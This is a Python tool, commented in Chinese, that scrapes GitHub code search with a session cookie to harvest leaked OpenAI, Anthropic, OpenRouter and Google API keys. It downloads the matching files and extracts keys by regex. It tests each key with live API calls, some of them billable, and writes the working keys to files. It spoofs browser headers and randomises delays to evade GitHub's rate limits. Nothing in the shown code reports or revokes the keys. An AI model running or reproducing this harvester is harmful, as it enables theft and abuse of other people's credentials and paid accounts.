#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GitHub API 密钥扫描器 (优化版)
参考 aliyun_scanner.py 架构，支持高并发扫描和实时保存
"""

import os
import re
import time
import threading
import concurrent.futures
import random
import json
import requests
from datetime import datetime
from queue import Queue
import urllib.parse

# 加载.env文件
try:
    from dotenv import load_dotenv
    load_dotenv()
    print("✅ 已加载.env文件")
except ImportError:
    print("⚠️ 未安装python-dotenv，将使用系统环境变量")

# --- 配置 ---
GITHUB_SESSION = os.getenv('GITHUB_SESSION')

# 并发配置
MAX_WORKERS = 10           # 最大并发线程数
API_DELAY = 1.0           # API请求间隔（秒）
SEARCH_PAGE_DELAY_MIN = 3 # 翻页最小等待
SEARCH_PAGE_DELAY_MAX = 6 # 翻页最大等待

# 存储结果
live_keys_queue = Queue()    # 存活密钥
processed_keys = set()       # 防止重复处理相同密钥
lock = threading.Lock()
file_lock = threading.Lock() # 文件写入锁

# 实时保存文件名
live_keys_filename = None
simple_keys_filename = None

# --- 密钥验证函数 ---

def check_openai_key(key):
    """验证OpenAI API密钥"""
    if not key.startswith("sk-"):
        return "无效格式"
    try:
        import openai
        client = openai.OpenAI(api_key=key)
        client.models.list()
        return "🟢 存活 (Live)"
    except ImportError:
        return "⚠️ 缺少 openai 库"
    except openai.AuthenticationError:
        return "🔴 无效/已吊销"
    except openai.RateLimitError:
        return "🟡 存活但超出配额"
    except Exception as e:
        return f"⚪ 未知错误: {str(e)}"

def check_anthropic_key(key):
    """验证Anthropic API密钥"""
    if not key.startswith("sk-ant-"):
        return "无效格式"
    try:
        import anthropic
        client = anthropic.Anthropic(api_key=key)
        client.messages.create(
            model="claude-3-haiku-20240307",
            max_tokens=1,
            messages=[{"role": "user", "content": "Hello"}]
        )
        return "🟢 存活 (Live)"
    except ImportError:
        return "⚠️ 缺少 anthropic 库"
    except anthropic.AuthenticationError:
        return "🔴 无效/已吊销"
    except anthropic.RateLimitError:
        return "🟡 存活但超出配额"
    except Exception as e:
        return f"⚪ 未知错误: {str(e)}"

def check_openrouter_key(key):
    """验证OpenRouter API密钥"""
    if not key.startswith("sk-or-v1-"):
        return "无效格式"
    try:
        headers = {
            'Authorization': f'Bearer {key}',
            'Content-Type': 'application/json',
            'HTTP-Referer': 'https://github.com/api-key-scanner',
            'X-Title': 'API Key Scanner'
        }
        payload = {
            "model": "openai/gpt-3.5-turbo",
            "messages": [{"role": "user", "content": "Hi"}],
            "max_tokens": 1
        }
        response = requests.post(
            'https://openrouter.ai/api/v1/chat/completions',
            headers=headers,
            json=payload,
            timeout=15
        )
        if response.status_code == 200:
            return "🟢 存活 (Live)"
        elif response.status_code == 401:
            return "🔴 无效/已吊销"
        elif response.status_code == 402:
            return "🟡 存活但余额不足"
        elif response.status_code == 429:
            return "🟡 存活但超出配额"
        else:
            return f"⚪ 状态码: {response.status_code}"
    except Exception as e:
        return f"⚪ 网络/其他错误: {str(e)}"

def check_google_key(key):
    """验证Google API密钥"""
    if not key.startswith("AIzaSy"):
        return "无效格式"
    url = f"https://translation.googleapis.com/language/translate/v2/languages?key={key}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return "🟢 存活 (Live)"
        elif response.status_code == 400:
            if "API key not valid" in response.text:
                return "🔴 无效/已吊销"
            return "🟡 疑似存活 (API未启用)"
        else:
            return f"⚪ 状态码: {response.status_code}"
    except Exception as e:
        return f"⚪ 网络错误: {str(e)}"

# --- 核心功能 ---

def get_headers():
    """构造 GitHub 搜索请求头"""
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Referer": "https://github.com/search?type=code",
    }
    if GITHUB_SESSION:
        headers["Cookie"] = f"user_session={GITHUB_SESSION}"
    return headers

def save_live_key_immediately(key_info):
    """实时保存存活密钥"""
    global live_keys_filename, simple_keys_filename
    
    with file_lock:
        # 初始化文件名
        if live_keys_filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            live_keys_filename = f'live_keys_{timestamp}.txt'
            simple_keys_filename = f'simple_keys_{timestamp}.txt'
            
            with open(live_keys_filename, 'w', encoding='utf-8') as f:
                f.write("=== 发现的存活API密钥 (实时更新) ===\n")
                f.write(f"扫描开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 60 + "\n\n")
        
        # 写入详细信息
        with open(live_keys_filename, 'a', encoding='utf-8') as f:
            f.write(f"🔑 类型: {key_info['type']}\n")
            f.write(f"   密钥: {key_info['key']}\n")
            f.write(f"   状态: {key_info['status']}\n")
            f.write(f"   来源: {key_info['url']}\n")
            f.write(f"   时间: {key_info['discovered_time']}\n")
            f.write("-" * 60 + "\n")
            
        # 写入纯密钥
        with open(simple_keys_filename, 'a', encoding='utf-8') as f:
            f.write(f"{key_info['key']}\n")
            
        print(f"💾 [保存] 已记录 {key_info['type']} -> {live_keys_filename}")

def process_file_content(file_url, target_config, worker_id):
    """处理单个文件：下载、正则提取、验证"""
    try:
        # 构造 Raw URL
        if "github.com" in file_url and "/blob/" in file_url:
            raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
        else:
            raw_url = file_url
            
        resp = requests.get(raw_url, timeout=10)
        if resp.status_code != 200:
            return
            
        content = resp.text
        
        # 提取密钥
        found_keys = re.findall(target_config['pattern'], content)
        
        for key in found_keys:
            with lock:
                if key in processed_keys:
                    continue
                processed_keys.add(key)
                
            print(f"[Worker-{worker_id}] 🔍 验证: {key[:15]}... ({target_config['name']})")
            
            status = target_config['checker'](key)
            print(f"[Worker-{worker_id}] 结果: {status}")
            
            if "🟢" in status or "🟡" in status or "Live" in status:
                key_info = {
                    'type': target_config['name'],
                    'key': key,
                    'status': status,
                    'url': raw_url,
                    'discovered_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
                save_live_key_immediately(key_info)
                live_keys_queue.put(key_info)
                
            time.sleep(API_DELAY)
            
    except Exception as e:
        print(f"[Worker-{worker_id}] ❌ 错误: {e}")

def search_and_scan(targets):
    """主扫描流程"""
    print(f"🚀 开始扫描 (Session模式, 并发数: {MAX_WORKERS})")
    print(f"📋 目标配置: {len(targets)} 类密钥")
    
    total_found_links = 0
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        for target in targets:
            print(f"\n📡 正在搜索目标: {target['name']}")
            print(f"   Query: {target['query']}")
            
            found_links = set()
            
            # 1. 搜索阶段 (顺序执行，避免触发 GitHub 搜索风控)
            for page in range(1, 6): # 默认前5页
                try:
                    url = "https://github.com/search"
                    params = {
                        'q': target['query'],
                        'type': 'code',
                        'p': page,
                        'o': 'desc',
                        's': 'indexed'
                    }
                    
                    resp = requests.get(url, headers=get_headers(), params=params, timeout=30)
                    
                    if resp.status_code == 429:
                        retry = int(resp.headers.get("Retry-After", 60))
                        print(f"   ⚠️ 429 Rate Limit. 等待 {retry} 秒...")
                        time.sleep(retry)
                        continue
                    elif resp.status_code != 200:
                        print(f"   ❌ 搜索请求失败 HTTP {resp.status_code}")
                        break
                        
                    # 检查登录状态
                    if "Sign in to GitHub" in resp.text:
                        print("   ❌ Session 失效! 请更新 .env")
                        return
                    
                    # 提取链接 (优化版正则)
                    # 匹配 href="/user/repo/blob/path/file"
                    page_links = re.findall(r'href="(/[^\s"\'<>]+/blob/[^\s"\'<>]+?)(?:#L\d+)?"', resp.text)
                    
                    if not page_links:
                        print("   ℹ️ 当前页无结果")
                        break
                        
                    new_links = 0
                    for link in page_links:
                        full_url = "https://github.com" + link.split('#')[0]
                        if full_url not in found_links:
                            found_links.add(full_url)
                            new_links += 1
                            
                    print(f"   第 {page} 页: 发现 {len(page_links)} 个结果 (新: {new_links})")
                    
                    # 随机延迟
                    time.sleep(random.uniform(SEARCH_PAGE_DELAY_MIN, SEARCH_PAGE_DELAY_MAX))
                    
                except Exception as e:
                    print(f"   搜索异常: {e}")
                    break
            
            print(f"   ✅ 目标 {target['name']} 搜索完成，共 {len(found_links)} 个文件待处理")
            total_found_links += len(found_links)
            
            # 2. 处理阶段 (并发执行)
            if found_links:
                futures = []
                for i, url in enumerate(found_links):
                    futures.append(
                        executor.submit(process_file_content, url, target, i % MAX_WORKERS)
                    )
                
                # 等待当前目标的所有任务完成 (可选：也可以全部扔进去最后一起等)
                concurrent.futures.wait(futures)
    
    print(f"\n🏁 扫描全部完成! 共处理 {total_found_links} 个文件")

if __name__ == '__main__':
    if not GITHUB_SESSION:
        print("❌ 错误: 未设置 GITHUB_SESSION 环境变量")
        exit(1)
        
    # 定义扫描目标
    TARGETS = [
        {
            "name": "OpenAI Project Key",
            "query": '"sk-proj-"',
            "pattern": r'(sk-proj-[A-Za-z0-9_-]{20,})',
            "checker": check_openai_key
        },
        {
            "name": "OpenAI Service Account",
            "query": '"sk-svcacct-"', 
            "pattern": r'(sk-svcacct-[A-Za-z0-9_-]{20,})',
            "checker": check_openai_key
        },
        {
            "name": "Anthropic Key",
            "query": '"sk-ant-api03-"',
            "pattern": r'(sk-ant-api03-[A-Za-z0-9_-]{20,})', 
            "checker": check_anthropic_key
        },
        {
            "name": "OpenRouter Key",
            "query": '"sk-or-v1-"',
            "pattern": r'(sk-or-v1-[A-Za-z0-9_-]{20,})',
            "checker": check_openrouter_key
        },
        {
            "name": "Google API Key",
            "query": '"AIzaSy" extension:js',
            "pattern": r'(AIzaSy[A-Za-z0-9_-]{20,})',
            "checker": check_google_key
        },
    ]
    
    search_and_scan(TARGETS)
